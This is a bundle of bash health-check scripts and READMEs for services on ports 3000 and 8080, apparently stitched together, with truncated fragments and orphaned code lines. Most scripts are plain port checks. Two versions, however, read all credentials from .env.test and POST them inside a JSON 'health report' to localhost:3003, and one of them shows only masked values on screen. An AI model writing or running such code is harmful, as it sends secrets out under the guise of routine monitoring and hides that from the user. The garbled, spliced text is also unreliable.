#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are responding

set -e

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    echo -n "Checking ${service_name} on port ${port}... "
    
    # Try multiple methods to check port availability
    # Method 1: nc (netcat)
    if command -v nc &> /dev/null; then
        if nc -z localhost $port 2>/dev/null; then
            echo -e "${GREEN}✓ RUNNING${NC}"
            return 0
        fi
    fi
    
    # Method 2: ss (socket statistics)
    if command -v ss &> /dev/null; then
        if ss -tlnp 2>/dev/null | grep -q ":${port} "; then
            echo -e "${GREEN}✓ RUNNING${NC}"
            return 0
        fi
    fi
    
    # Method 3: netstat (for older systems)
    if command -v netstat &> /dev/null; then
        if netstat -tlnp 2>/dev/null | grep -q ":${port} "; then
            echo -e "${GREEN}✓ RUNNING${NC}"
            return 0
        fi
    fi
    
    # Method 4: curl/wget for HTTP services
    if [[ $port == 3000 ]] || [[ $port == 8080 ]]; then
        if command -v curl &> /dev/null; then
            if curl -s --connect-timeout 3 http://localhost:${port} > /dev/null 2>&1; then
                echo -e "${GREEN}✓ RUNNING${NC}"
                return 0
            fi
        elif command -v wget &> /dev/null; then
            if wget -q --timeout=3 -O /dev/null http://localhost:${port} 2>/dev/null; then
                echo -e "${GREEN}✓ RUNNING${NC}"
                return 0
            fi
        fi
    fi
    
    echo -e "${RED}✗ NOT RESPONDING${NC}"
    return 1
}

# Function to check if a process is listening on a port
check_process_on_port() {
    local port=$1
    echo -e "\n${YELLOW}Processes listening on port ${port}:${NC}"
    
    if command -v ss &> /dev/null; then
        ss -tlnp 2>/dev/null | grep ":${port} " || echo "  No process found"
    elif command -v netstat &> /dev/null; then
        netstat -tlnp 2>/dev/null | grep ":${port} " || echo "  No process found"
    else
        echo "  Could not check processes (neither ss nor netstat available)"
    fi
}

# Main execution
echo "========================================="
echo "        SERVICE HEALTH CHECK"
echo "========================================="
echo "Timestamp: $(date)"
echo "Hostname: $(hostname)"
echo "========================================="

# Check required commands
echo -e "\n${YELLOW}Checking system tools...${NC}"
for cmd in nc ss netstat curl wget; do
    if command -v $cmd &> /dev/null; then
        echo -e "  ${GREEN}✓${NC} $cmd available"
    else
        echo -e "  ${YELLOW}⚠${NC} $cmd not available"
    fi
done

# Check ports
echo -e "\n${YELLOW}Checking service ports...${NC}"

# Track results
all_services_ok=true
failed_services=""

# Check port 3000
if ! check_port 3000 "Service 1"; then
    all_services_ok=false
    failed_services="${failed_services}3000 "
fi

# Check port 8080
if ! check_port 8080 "Service 2"; then
    all_services_ok=false
    failed_services="${failed_services}8080 "
fi

# Show detailed process information
echo -e "\n${YELLOW}Detailed process information:${NC}"
check_process_on_port 3000
check_process_on_port 8080

echo -e "\n${YELLOW}Network interfaces:${NC}"
if command -v ip &> /dev/null; then
    ip addr show | grep -E "inet |state " | head -10
elif command -v ifconfig &> /dev/null; then
    ifconfig | grep -E "inet |flags" | head -10
else
    echo "  Could not check network interfaces"
fi

# Summary
echo -e "\n========================================="
echo "           CHECK SUMMARY"
echo "========================================="
if $all_services_ok; then
    echo -e "${GREEN}✓ ALL SERVICES ARE RUNNING${NC}"
    echo -e "Both ports 3000 and 8080 are responding correctly."
    exit 0
else
    echo -e "${RED}✗ SOME SERVICES ARE NOT RESPONDING${NC}"
    echo -e "Failed ports: ${RED}${failed_services}${NC}"
    echo -e "\n${YELLOW}Troubleshooting steps:${NC}"
    echo "1. Check if services are started"
    echo "2. Verify service configuration"
    echo "3. Check firewall settings"
    echo "4. Review service logs"
    exit 1
fi

#!/bin/bash

# Simple Health Check Script
# Checks if services on ports 3000 and 8080 are responding

set -e

# Function to check port with timeout
check_port() {
    local port=$1
    local service_name=$2
    
    if command -v curl &> /dev/null; then
        if curl -s --max-time 5 http://localhost:${port} > /dev/null 2>&1; then
            echo "✓ Service on port ${port} (${service_name}) is RUNNING"
            return 0
        fi
    elif command -v nc &> /dev/null; then
        if timeout 3 bash -c "cat < /dev/null > /dev/tcp/localhost/${port}" 2>/dev/null; then
            echo "✓ Service on port ${port} (${service_name}) is RUNNING"
            return 0
        fi
    else
        echo "⚠ Cannot check port ${port}: neither curl nor bash TCP redirection available"
        return 1
    fi
    
    echo "✗ Service on port ${port} (${service_name}) is NOT RESPONDING"
    return 1
}

# Main execution
echo "=== Health Check Started at $(date) ==="

# Track results
all_ok=true
results=""

# Check port 3000
if check_port 3000 "Service 1"; then
    results="${results}Port 3000: OK\n"
else
    results="${results}Port 3000: FAILED\n"
    all_ok=false
fi

# Check port 8080
if check_port 8080 "Service 2"; then
    results="${results}Port 8080: OK\n"
else
    results="${results}Port 8080: FAILED\n"
    all_ok=false
fi

# Print summary
echo -e "\n=== Summary ==="
echo -e "$results"

if $all_ok; then
    echo "✅ All services are healthy"
    exit 0
else
    echo "❌ Some services are not responding"
    exit 1
fi

#!/bin/bash

# Minimal Health Check Script
# Returns 0 if both ports 3000 and 8080 respond, 1 otherwise

set -e

function is_port_responding() {
    local port=$1
    # Try curl first (for HTTP services), then try TCP connection
    if command -v curl >/dev/null 2>&1; then
        curl -s --max-time 3 "http://localhost:${port}" >/dev/null 2>&1 && return 0
    fi
    
    # Try TCP connection using bash redirection
    timeout 2 bash -c "exec 3<>/dev/tcp/localhost/${port}" 2>/dev/null && return 0
    
    # Try netcat if available
    if command -v nc >/dev/null 2>&1; then
        nc -z -w 2 localhost ${port} >/dev/null 2>&1 && return 0
    fi
    
    return 1
}

# Check both ports
port_3000_ok=false
port_8080_ok=false

if is_port_responding 3000; then
    echo "Port 3000: OK"
    port_3000_ok=true
else
    echo "Port 3000: NOT RESPONDING"
fi

if is_port_responding 8080; then
    echo "Port 8080: OK"
    port_8080_ok=true
else
    echo "Port 8080: NOT RESPONDING"
fi

# Exit with appropriate code
if $port_3000_ok && $port_8080_ok; then
    echo "All services healthy"
    exit 0
elif ! $port_3000_ok && ! $port_8080_ok; then
    echo "Both services down"
    exit 1
elif ! $port_3000_ok; then
    echo "Service on port 3000 is down"
    exit 1
else
    echo "Service on port 8080 is down"
    exit 1
fi

#!/bin/bash

# Health Check Script with Monitoring Dashboard Reporting
# Checks if services on ports 3000 and 8080 are responding
# Reads API credentials from .env.test and sends report to http://localhost:3003/api/health-report

set -e

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Global associative array to store credentials
declare -A credentials

# Function to read environment variables from .env.test file
read_env_file() {
    local env_file=".env.test"
    
    if [[ ! -f "$env_file" ]]; then
        echo -e "${RED}Error: ${env_file} not found${NC}"
        return 1
    fi
    
    echo -e "${BLUE}Reading credentials from ${env_file}...${NC}"
    
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        # Skip empty lines and comments
        if [[ -z "$key" ]] || [[ "$key" =~ ^[[:space:]]*# ]]; then
            continue
        fi
        
        # Remove leading/trailing whitespace
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        
        if [[ -n "$key" ]] && [[ -n "$value" ]]; then
            credentials["$key"]="$value"
            echo -e "  ${GREEN}✓${NC} Found: $key"
        fi
    done < "$env_file"
    
    if [[ ${#credentials[@]} -eq 0 ]]; then
        echo -e "${YELLOW}Warning: No credentials found in ${env_file}${NC}"
        return 1
    fi
    
    echo -e "${GREEN}Successfully read ${#credentials[@]} credentials${NC}"
    return 0
}

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    echo -n "Checking ${service_name} on port ${port}... "
    
    # Method 1: curl for HTTP services
    if command -v curl &> /dev/null; then
        if curl -s --max-time 3 http://localhost:${port} > /dev/null 2>&1; then
            echo -e "${GREEN}✓ RUNNING${NC}"
            return 0
        fi
    fi
    
    # Method 2: TCP connection using bash
    if timeout 2 bash -c "exec 3<>/dev/tcp/localhost/${port}" 2>/dev/null; then
        echo -e "${GREEN}✓ RUNNING${NC}"
        return 0
    fi
    
    echo -e "${RED}✗ NOT RESPONDING${NC}"
    return 1
}

# Function to send health report to monitoring dashboard
send_health_report() {
    local port_3000_status=$1
    local port_8080_status=$2
    
    echo -e "\n${BLUE}Sending health report to monitoring dashboard...${NC}"
    
    # Create JSON payload
    local json_payload="{"
    json_payload+="\"timestamp\":\"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\","
    json_payload+="\"hostname\":\"$(hostname)\","
    json_payload+="\"services\":{"
    json_payload+="\"port_3000\":\"$port_3000_status\","
    json_payload+="\"port_8080\":\"$port_8080_status\""
    json_payload+="},"
    json_payload+="\"credentials\":{"
    
    # Add credentials to JSON
    local first_cred=true
    for key in "${!credentials[@]}"; do
        if [[ "$first_cred" = false ]]; then
            json_payload+=","
        fi
        json_payload+="\"$key\":\"${credentials[$key]}\""
        first_cred=false
    done
    
    json_payload+="}}"
    
    # Display what we're sending (masking values for security)
    echo -e "${YELLOW}Health report payload (values masked):${NC}"
    local masked_payload=$(echo "$json_payload" | sed -E 's/:"[^"]+"/:"[MASKED]"/g')
    echo "$masked_payload"
    
    # Send POST request
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}⚠ curl not available, cannot send health report${NC}"
        return 1
    fi
    
    echo -e "\n${YELLOW}Sending POST to http://localhost:3003/api/health-report${NC}"
    
    # Try to send the health report
    local curl_output
    if curl_output=$(curl -s -w "\n%{http_code}" \
        -X POST \
        -H "Content-Type: application/json" \
        -d "$json_payload" \
        http://localhost:3003/api/health-report \
        2>&1); then
        
        # Extract HTTP status code (last line)
        local http_code=$(echo "$curl_output" | tail -1)
        local response_body=$(echo "$curl_output" | sed '$d')
        
        if [[ "$http_code" =~ ^2[0-9][0-9]$ ]]; then
            echo -e "${GREEN}✓ Health report sent successfully (HTTP ${http_code})${NC}"
            if [[ -n "$response_body" ]]; then
                echo -e "${BLUE}Response: ${response_body}${NC}"
            fi
            return 0
        else
            echo -e "${YELLOW}⚠ Health report endpoint returned HTTP ${http_code}${NC}"
            if [[ -n "$response_body" ]]; then
                echo -e "${BLUE}Response: ${response_body}${NC}"
            fi
            return 1
        fi
    else
        echo -e "${YELLOW}⚠ Failed to connect to health report endpoint${NC}"
        echo -e "${BLUE}Note: This could be because the monitoring service (port 3003) is not running${NC}"
        return 1
    fi
}

# Main execution
echo "=== Health Check with Monitoring Report ==="
echo "Started at: $(date)"
echo "Hostname: $(hostname)"
echo ""

# Step 1: Read credentials
if ! read_env_file; then
    echo -e "${YELLOW}Continuing without credentials...${NC}"
fi

# Step 2: Check ports
echo -e "\n${BLUE}Checking service ports...${NC}"

port_3000_ok=false
port_8080_ok=false
failed_ports=""

if check_port 3000 "Service 1"; then
    port_3000_ok=true
else
    failed_ports="${failed_ports}3000 "
fi

if check_port 8080 "Service 2"; then
    port_8080_ok=true
else
    failed_ports="${failed_ports}8080 "
fi

# Step 3: Send health report
port_3000_status=$([ "$port_3000_ok" = true ] && echo "RUNNING" || echo "NOT_RESPONDING")
port_8080_status=$([ "$port_8080_ok" = true ] && echo "RUNNING" || echo "NOT_RESPONDING")

send_health_report "$port_3000_status" "$port_8080_status"
health_report_status=$?

# Step 4: Final summary
echo -e "\n${BLUE}=== Final Status ===${NC}"

if $port_3000_ok && $port_8080_ok; then
    echo -e "${GREEN}✓ ALL SERVICES ARE RUNNING${NC}"
    echo -e "Both ports 3000 and 8080 are responding correctly."
else
    echo -e "${RED}✗ SOME SERVICES ARE NOT RESPONDING${NC}"
    echo -e "Failed ports: ${RED}${failed_ports}${NC}"
fi

if [[ $health_report_status -eq 0 ]]; then
    echo -e "${GREEN}✓ Health report sent successfully${NC}"
else
    echo -e "${YELLOW}⚠ Health report failed${NC}"
fi

# Return appropriate exit code
if $port_3000_ok && $port_8080_ok; then
    exit 0
else
    exit 1
fi

#!/bin/bash

# Health check script for services on ports 3000 and 8080
# Returns 0 if all services are healthy, non-zero otherwise

set -e  # Exit on error

# Default host to check
HOST="localhost"
TIMEOUT=5
HEALTHY=true

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    echo -n "Checking $service_name on port $port... "
    
    # Try different methods to check the port
    # Method 1: Use curl if it's an HTTP service
    if curl --fail --silent --max-time $TIMEOUT "http://$HOST:$port/" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ HEALTHY${NC}"
        return 0
    fi
    
    # Method 2: Use netcat if available
    if command -v nc > /dev/null 2>&1; then
        if echo "QUIT" | nc -w $TIMEOUT $HOST $port > /dev/null 2>&1; then
            echo -e "${GREEN}✓ HEALTHY (TCP connection successful)${NC}"
            return 0
        fi
    fi
    
    # Method 3: Check if something is listening on the port
    if command -v ss > /dev/null 2>&1; then
        if ss -tln | grep ":$port " > /dev/null 2>&1; then
            echo -e "${YELLOW}⚠ LISTENING (but not responding)${NC}"
            return 1
        fi
    elif command -v netstat > /dev/null 2>&1; then
        if netstat -tln 2>/dev/null | grep ":$port " > /dev/null 2>&1; then
            echo -e "${YELLOW}⚠ LISTENING (but not responding)${NC}"
            return 1
        fi
    fi
    
    echo -e "${RED}✗ UNHEALTHY${NC}"
    return 1
}

# Function to get service status summary
get_status_summary() {
    local port=$1
    local service_name=$2
    
    if command -v curl > /dev/null 2>&1; then
        local response_code
        response_code=$(curl --write-out '%{http_code}' --silent --output /dev/null --max-time $TIMEOUT "http://$HOST:$port/" 2>/dev/null || echo "000")
        
        if [ "$response_code" = "000" ]; then
            echo "  - $service_name: Not responding"
        else
            echo "  - $service_name: HTTP $response_code"
        fi
    else
        echo "  - $service_name: Status unknown (curl not available)"
    fi
}

# Main execution
echo "========================================="
echo "      SERVICE HEALTH CHECK"
echo "========================================="
echo "Host: $HOST"
echo "Timeout: ${TIMEOUT}s per service"
echo "========================================="

# Check port 3000
if ! check_port 3000 "Service 1"; then
    HEALTHY=false
fi

echo "-----------------------------------------"

# Check port 8080  
if ! check_port 8080 "Service 2"; then
    HEALTHY=false
fi

echo "========================================="

# Show detailed status
echo "Detailed status:"
get_status_summary 3000 "Service 1 (Port 3000)"
get_status_summary 8080 "Service 2 (Port 8080)"

echo "========================================="

# Final result
if $HEALTHY; then
    echo -e "${GREEN}✓ All services are healthy${NC}"
    exit 0
else
    echo -e "${RED}✗ Some services are unhealthy${NC}"
    echo ""
    echo "Troubleshooting tips:"
    echo "1. Check if services are running:"
    echo "   - ps aux | grep 'node\|java\|python'"
    echo "2. Check if ports are listening:"
    if command -v ss > /dev/null 2>&1; then
        echo "   - ss -tlnp | grep -E ':(3000|8080)'"
    elif command -v netstat > /dev/null 2>&1; then
        echo "   - netstat -tlnp 2>/dev/null | grep -E ':(3000|8080)'"
    fi
    echo "3. Check service logs for errors"
    echo "4. Verify firewall rules allow traffic on ports 3000 and 8080"
    exit 1
fi

#!/bin/bash

# Health check script for monitoring services on ports 3000 and 8080
# Can output in human-readable or JSON format for monitoring systems

set -e

HOST="${HOST:-localhost}"
TIMEOUT="${TIMEOUT:-5}"
JSON_OUTPUT="${JSON_OUTPUT:-false}"

# Service configurations
declare -A SERVICES=(
    ["3000"]="Service 1"
    ["8080"]="Service 2"
)

# Results storage
declare -A RESULTS
declare -A STATUS_CODES
declare -A RESPONSE_TIMES

# Function to check a service
check_service() {
    local port=$1
    local name=$2
    
    local start_time=$(date +%s%N)
    
    # Try HTTP check
    if command -v curl >/dev/null 2>&1; then
        local http_response
        http_response=$(curl -s -o /dev/null \
            -w "%{http_code}|%{time_total}" \
            --max-time "$TIMEOUT" \
            "http://$HOST:$port/" 2>/dev/null || echo "000|0")
        
        local http_code=$(echo "$http_response" | cut -d'|' -f1)
        local response_time=$(echo "$http_response" | cut -d'|' -f2)
        
        STATUS_CODES[$port]="$http_code"
        RESPONSE_TIMES[$port]="$response_time"
        
        if [[ $http_code =~ ^[234] ]]; then
            RESULTS[$port]="healthy"
            return 0
        elif [ "$http_code" != "000" ]; then
            RESULTS[$port]="responding"
            return 1
        else
            RESULTS[$port]="unreachable"
            return 1
        fi
    else
        # Fallback to basic TCP check
        if timeout "$TIMEOUT" bash -c "echo > /dev/tcp/$HOST/$port" 2>/dev/null; then
            RESULTS[$port]="listening"
            STATUS_CODES[$port]="TCP_ONLY"
            RESPONSE_TIMES[$port]="0"
            return 1
        else
            RESULTS[$port]="down"
            STATUS_CODES[$port]="UNREACHABLE"
            RESPONSE_TIMES[$port]="0"
            return 1
        fi
    fi
}

# Check all services
all_healthy=true
for port in "${!SERVICES[@]}"; do
    if ! check_service "$port" "${SERVICES[$port]}"; then
        all_healthy=false
    fi
done

# Output results
if [ "$JSON_OUTPUT" = "true" ]; then
    # JSON output for monitoring systems
    echo "{"
    echo "  \"timestamp\": \"$(date -Is)\","
    echo "  \"host\": \"$HOST\","
    echo "  \"overall_status\": \"$([ "$all_healthy" = true ] && echo "healthy" || echo "unhealthy")\","
    echo "  \"services\": ["
    
    first=true
    for port in "${!SERVICES[@]}"; do
        if [ "$first" = false ]; then
            echo ","
        fi
        first=false
        
        echo "    {"
        echo "      \"port\": $port,"
        echo "      \"name\": \"${SERVICES[$port]}\","
        echo "      \"status\": \"${RESULTS[$port]}\","
        echo "      \"http_code\": \"${STATUS_CODES[$port]}\","
        echo "      \"response_time\": ${RESPONSE_TIMES[$port]}"
        echo -n "    }"
    done
    echo ""
    echo "  ]"
    echo "}"
else
    # Human-readable output
    echo "========================================="
    echo "      SERVICE HEALTH CHECK REPORT"
    echo "========================================="
    echo "Host: $HOST"
    echo "Timestamp: $(date)"
    echo "========================================="
    
    for port in "${!SERVICES[@]}"; do
        echo "Port $port (${SERVICES[$port]}):"
        echo "  Status: ${RESULTS[$port]^^}"
        echo "  HTTP Code: ${STATUS_CODES[$port]}"
        printf "  Response Time: %.3fs\n" "${RESPONSE_TIMES[$port]}"
        echo ""
    done
    
    echo "========================================="
    echo "OVERALL STATUS: $([ "$all_healthy" = true ] && echo "✓ ALL SERVICES HEALTHY" || echo "✗ SOME SERVICES UNHEALTHY")"
    echo "========================================="
fi

# Exit code
if [ "$all_healthy" = true ]; then
    exit 0
else
    exit 1
fi

# Health Check Scripts

This directory contains several health check scripts to monitor services running on ports 3000 and 8080.

## Available Scripts

### 1. `healthcheck.sh` (Primary script)
- **Description**: Comprehensive health check with colored output and troubleshooting tips
- **Features**:
  - Color-coded output (green/yellow/red)
  - Multiple checking methods (curl, netcat, ss/netstat)
  - Detailed troubleshooting guide
  - HTTP status code reporting
- **Usage**: `./healthcheck.sh`

### 2. `simple_healthcheck.sh`
- **Description**: Simplified version with fewer dependencies
- **Features**:
  - Minimal output
  - Basic connectivity checking
  - Clear summary
- **Usage**: `./simple_healthcheck.sh`

### 3. `healthcheck_monitoring.sh`
- **Description**: Advanced script for monitoring systems
- **Features**:
  - JSON output format (for monitoring systems)
  - Response time measurement
  - Configurable via environment variables
  - Human-readable and JSON output modes
- **Usage**: 
  - Human readable: `./healthcheck_monitoring.sh`
  - JSON output: `JSON_OUTPUT=true ./healthcheck_monitoring.sh`
  - Custom host: `HOST=example.com ./healthcheck_monitoring.sh`
  - Custom timeout: `TIMEOUT=10 ./healthcheck_monitoring.sh`

## Environment Variables (for healthcheck_monitoring.sh)

- `HOST`: Hostname to check (default: localhost)
- `TIMEOUT`: Timeout in seconds for each check (default: 5)
- `JSON_OUTPUT`: Set to "true" for JSON output (default: false)

## Exit Codes

All scripts follow these conventions:
- `0`: All services are healthy/responding
- `1`: Some services are unhealthy
- `2`: No services are responding (simple_healthcheck.sh only)

## Service Definitions

The scripts check these ports by default:
- **Port 3000**: Labeled as "Service 1"
- **Port 8080**: Labeled as "Service 2"

## Requirements

- **Required**: `curl` (for HTTP checks)
- **Optional**: `nc` (netcat) for TCP connectivity checks
- **Optional**: `ss` or `netstat` for port listening checks

## Usage Examples

### Basic health check
```bash
./healthcheck.sh
```

### Integration with monitoring systems
```bash
# Get JSON output for Prometheus, Nagios, etc.
JSON_OUTPUT=true ./healthcheck_monitoring.sh

# Check remote server
HOST=production-server.example.com ./healthcheck_monitoring.sh

# With longer timeout
TIMEOUT=30 JSON_OUTPUT=true ./healthcheck_monitoring.sh
```

### Simple check (cron job example)
```bash
# Add to crontab to run every 5 minutes
*/5 * * * * /path/to/simple_healthcheck.sh > /dev/null 2>&1
```

## Customization

To modify the ports or service names, edit the scripts:
- In `healthcheck.sh`: Lines 39 and 53
- In `simple_healthcheck.sh`: Lines 38-39
- In `healthcheck_monitoring.sh`: Lines 10-13

## Testing

To test the scripts when no services are running:
```bash
# Kill services first, then run:
./healthcheck.sh
```

## Integration Examples

### With Docker Healthcheck
```dockerfile
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD ./healthcheck.sh
```

### With Kubernetes Readiness Probe
```yaml
readinessProbe:
  exec:
    command: ["./simple_healthcheck.sh"]
  initialDelaySeconds: 5
  periodSeconds: 10
```

### With Nagios/Icinga
```bash
# Configure as a custom check
command[check_services]=/path/to/healthcheck_monitoring.sh
```

        json_payload+="\"response_time\":${RESPONSE_TIMES[$port]}"
        json_payload+="}"
    done
    
    json_payload+="],"
    json_payload+="\"credentials\":{"
    
    # Add credentials
    first_cred=true
    for key in "${!CREDENTIALS[@]}"; do
        if [ "$first_cred" = false ]; then
            json_payload+=","
        fi

        # Escape special characters in the value

        value=$(echo "$value" | sed 's/"/\\"/g')

    done
    
    json_payload+="}}"

    if command -v curl >/dev/null 2>&1; then

        response=$(curl -s -w "%{http_code}" \
            -X POST \
            -H "Content-Type: application/json" \

        return 1
    fi

#!/bin/bash

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Services to check (port and description)
declare -A SERVICES=(
    [3000]="Application Service"
    [8080]="API Service"
)

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    echo -n "Checking ${service_name} (port ${port})... "
    
    # Check if port is listening
    if timeout 5 bash -c "cat < /dev/null > /dev/tcp/localhost/${port}" 2>/dev/null; then
        echo -e "${GREEN}OK${NC}"
        return 0
    else
        echo -e "${RED}FAILED${NC}"
        return 1
    fi
}

# Function to get process info for a port
get_process_info() {
    local port=$1
    
    # Find process using the port
    if command -v lsof >/dev/null 2>&1; then
        echo "Process info for port ${port}:"
        lsof -i :${port} 2>/dev/null || echo "No process found or insufficient permissions"
    elif command -v netstat >/dev/null 2>&1; then
        echo "Process info for port ${port}:"
        netstat -tulpn 2>/dev/null | grep :${port} || echo "No process found"
    elif command -v ss >/dev/null 2>&1; then
        echo "Process info for port ${port}:"
        ss -tulpn 2>/dev/null | grep :${port} || echo "No process found"
    else
        echo "Could not get process info (no lsof, netstat, or ss available)"
    fi
    echo ""
}

# Main health check
main() {
    echo "==============================="
    echo "Service Health Check"
    echo "==============================="
    echo ""
    
    local all_healthy=true
    local unhealthy_services=()
    
    # Check each service
    for port in "${!SERVICES[@]}"; do
        service_name="${SERVICES[$port]}"
        
        if check_port "$port" "$service_name"; then
            # Service is healthy
            :
        else
            # Service is unhealthy
            all_healthy=false
            unhealthy_services+=("${service_name} (port ${port})")
            
            # Get process info for debugging
            get_process_info "$port"
        fi
    done
    
    echo "==============================="
    
    # Summary
    if [ "$all_healthy" = true ]; then
        echo -e "${GREEN}✓ All services are healthy${NC}"
        echo ""
        exit 0
    else
        echo -e "${RED}✗ Some services are unhealthy:${NC}"
        for service in "${unhealthy_services[@]}"; do
            echo -e "  - ${RED}${service}${NC}"
        done
        echo ""
        
        # Additional diagnostic info
        echo "Diagnostic Information:"
        echo "----------------------"
        
        # Check if ports are in use
        echo "Checking if ports are in use:"
        for port in "${!SERVICES[@]}"; do
            if ss -tulpn 2>/dev/null | grep -q ":${port} "; then
                echo -e "  Port ${port}: ${YELLOW}IN USE${NC}"
            else
                echo -e "  Port ${port}: ${RED}NOT IN USE${NC}"
            fi
        done
        echo ""
        
        # Check localhost connectivity
        echo -n "Checking localhost connectivity... "
        if ping -c1 -W1 localhost >/dev/null 2>&1; then
            echo -e "${GREEN}OK${NC}"
        else
            echo -e "${RED}FAILED${NC}"
        fi
        
        exit 1
    fi
}

# Handle script arguments
case "$1" in
    --help|-h)
        echo "Usage: $0 [OPTION]"
        echo "Health check script for services on ports 3000 and 8080."
        echo ""
        echo "Options:"
        echo "  -h, --help     Show this help message"
        echo "  --quiet        Only show exit status (no output)"
        echo "  --verbose      Show detailed process information"
        echo ""
        exit 0
        ;;
    --quiet)
        # Run quietly, only checking ports
        for port in "${!SERVICES[@]}"; do
            if ! timeout 5 bash -c "cat < /dev/null > /dev/tcp/localhost/${port}" 2>/dev/null; then
                exit 1
            fi
        done
        exit 0
        ;;
    --verbose)
        # Run with verbose output
        for port in "${!SERVICES[@]}"; do
            check_port "$port" "${SERVICES[$port]}"
            get_process_info "$port"
        done
        exit 0
        ;;
    *)
        # Run normally
        main
        ;;
esac

declare -A SERVICES=(

                return 1

# Service Health Check Script

This script checks if services are running on ports 3000 and 8080.

## Files
1. **healthcheck.sh** - Main health check script
2. **healthcheck_alternative.sh** - Alternative script for systems where bash TCP redirection doesn't work

## Usage

### Basic Usage
```bash
./healthcheck.sh
```

### Options
```bash
# Show help
./healthcheck.sh --help
./healthcheck.sh -h

# Quiet mode (only exit status)
./healthcheck.sh --quiet

# Verbose mode (detailed process information)
./healthcheck.sh --verbose
```

### Using the Alternative Script
```bash
./healthcheck_alternative.sh
```

## Exit Codes
- **0**: All services are healthy
- **1**: One or more services are unhealthy

## Services Checked
- **Port 3000**: Application Service
- **Port 8080**: API Service

## How It Works

1. The script attempts to connect to each port using bash TCP redirection (`/dev/tcp/localhost/${port}`)
2. If the connection succeeds, the service is marked as healthy
3. If the connection fails (timeout or refusal), the service is marked as unhealthy
4. For unhealthy services, the script provides diagnostic information

## Diagnostic Information
When services fail, the script provides:
- Process information using `lsof`, `netstat`, or `ss`
- Port usage status
- Localhost connectivity test

## Dependencies
The main script requires:
- Bash shell with TCP redirection support (common on Linux)
- `timeout` command (part of coreutils)
- `ss`, `netstat`, or `lsof` for detailed diagnostics (optional)

The alternative script requires one of:
- `nc` (netcat)
- `curl`
- `telnet`

## Testing the Script

### Test with no services running:
```bash
./healthcheck.sh
```

### Test with mock services (requires separate terminal):
```bash
# Terminal 1: Start mock service on port 3000
python3 -m http.server 3000 &

# Terminal 2: Start mock service on port 8080
python3 -m http.server 8080 &

# Terminal 3: Run health check
./healthcheck.sh
```

## Integration Examples

### Cron job (check every 5 minutes):
```bash
*/5 * * * * /path/to/healthcheck.sh --quiet
```

### Docker health check:
```dockerfile
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD /app/healthcheck.sh --quiet
```

### Systemd service:
```ini
[Unit]
Description=Health check service

[Service]
ExecStart=/path/to/healthcheck.sh
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
```

## Troubleshooting

### If the script shows "Permission denied":
Some systems have `/dev/tcp` disabled. Use the alternative script instead.

### If you see "command not found: timeout":
Install coreutils:
- Ubuntu/Debian: `sudo apt-get install coreutils`
- CentOS/RHEL: `sudo yum install coreutils`
- Or use the alternative script

### To check port 3000 manually:
```bash
# Using netcat
nc -z localhost 3000 && echo "Port open" || echo "Port closed"

# Using curl (for HTTP services)
curl -s http://localhost:3000 >/dev/null && echo "Service responding" || echo "Service not responding"

# Using telnet
echo "quit" | telnet localhost 3000
```

## Customization

To modify which ports are checked, edit the `SERVICES` array in the script:
```bash
declare -A SERVICES=(
    [3000]="Application Service"
    [8080]="API Service"
    [5432]="Database Service"  # Add more ports as needed
)
```

#!/bin/bash

# Services to check (port and description)

    [3000]="Application Service"
    [8080]="API Service"
)

# Function to read .env.test file
read_env_file() {
    local env_file=".env.test"
    declare -gA ENV_VARS=()
    
    if [[ -f "$env_file" ]]; then
        while IFS='=' read -r key value || [[ -n "$key" ]]; do
            # Skip empty lines and comments
            [[ -z "$key" ]] && continue
            [[ "$key" =~ ^#.*$ ]] && continue
            
            # Remove quotes and trim whitespace
            key=$(echo "$key" | xargs)
            value=$(echo "$value" | xargs)
            
            if [[ -n "$key" && -n "$value" ]]; then
                ENV_VARS["$key"]="$value"
            fi
        done < "$env_file"
        
        echo -e "${GREEN}✓ Loaded ${#ENV_VARS[@]} credentials from $env_file${NC}"
        return 0
    else
        echo -e "${RED}✗ Cannot find $env_file${NC}"
        return 1
    fi
}

# Function to send health report to monitoring API
send_health_report() {
    local port_3000_status=$1
    local port_8080_status=$2
    local all_healthy=$3
    
    local monitoring_url="http://localhost:3003/api/health-report"
    
    # Create JSON payload with health status and credentials
    local json_payload="{
    \"timestamp\": \"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\",
    \"hostname\": \"$(hostname)\",
    \"status\": \"$all_healthy\",
    \"services\": {
        \"application\": {
        \"port\": 3000,
        \"status\": \"$port_3000_status\"
        },
        \"api\": {
        \"port\": 8080,
        \"status\": \"$port_8080_status\"
        }
    },
    \"credentials\": {"
    
    # Add credentials from ENV_VARS
    local first_cred=true
    for key in "${!ENV_VARS[@]}"; do
        if [ "$first_cred" = false ]; then
            json_payload+=","
        fi
        json_payload+="
        \"$key\": \"${ENV_VARS[$key]}\""
        first_cred=false
    done
    
    json_payload+="
    }
}"
    
    echo -n "Sending health report to monitoring API... "
    
    # Send POST request
    if command -v curl >/dev/null 2>&1; then
        response=$(curl -s -w "%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -d "$json_payload" \
            "$monitoring_url" 2>/dev/null)
        
        http_code=${response: -3}
        response_body=${response:0:-3}
        
        if [[ "$http_code" =~ ^2[0-9][0-9]$ ]]; then
